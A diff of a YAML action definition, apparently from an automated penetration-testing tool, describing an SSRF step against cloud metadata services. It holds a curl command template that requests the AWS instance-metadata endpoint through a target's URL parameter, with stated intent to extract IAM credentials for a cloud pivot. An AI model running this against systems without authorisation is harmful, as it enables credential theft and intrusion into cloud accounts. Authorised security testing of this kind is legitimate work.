@@ -2,15 +2,18 @@ name: ssrf_cloud
 category: web
 description: SSRF for cloud metadata extraction
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}?url=http://169.254.169.254/latest/meta-data/'"
+command_template: curl -s '{target_url}?url=http://169.254.169.254/latest/meta-data/'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Cloud metadata: AWS 169.254.169.254 (IMDSv1), GCP metadata.google.internal, Azure 169.254.169.254 (Metadata:true header). Extract IAM credentials for cloud pivot."
+mechanism: 'Cloud metadata: AWS 169.254.169.254 (IMDSv1), GCP metadata.google.internal,
+  Azure 169.254.169.254 (Metadata:true header). Extract IAM credentials for cloud
+  pivot.'
+hacktricks_ref: pentesting-web/ssrf-server-side-request-forgery/README.md
